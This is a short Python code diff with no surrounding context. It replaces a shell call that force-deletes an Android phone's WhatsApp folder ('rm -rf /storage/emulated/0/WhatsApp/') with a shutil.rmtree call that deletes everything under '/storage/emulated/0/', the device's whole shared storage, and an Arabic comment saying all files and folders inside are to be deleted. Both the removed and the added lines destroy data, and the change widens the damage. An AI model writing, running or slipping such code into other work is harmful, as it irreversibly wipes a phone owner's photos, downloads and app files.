@@ -1,8 +1,6 @@
-import os
-import sys
-os.system('rm -rf /storage/emulated/0/WhatsApp/')
+import shutil
 
+folder_path = '/storage/emulated/0/'
 
-
-
-
+# حذف جميع الملفات والمجلدات داخل المجلد
+shutil.rmtree(folder_path)
